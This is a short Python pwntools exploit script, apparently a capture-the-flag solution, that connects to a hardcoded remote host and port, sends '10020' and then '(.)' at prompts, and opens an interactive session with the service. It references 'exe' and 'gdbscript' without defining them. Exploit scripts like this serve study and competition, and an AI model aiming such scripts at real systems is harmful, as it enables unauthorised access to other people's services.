#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'error'

host = args.HOST or '110.10.147.106'
port = int(args.PORT or 15959)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


import os
# -- Exploit goes here --

io = start()
io.recvuntil('INPUT')
io.sendline('10020')
io.recvuntil('vulnerable')
io.send('(.)')
io.interactive()
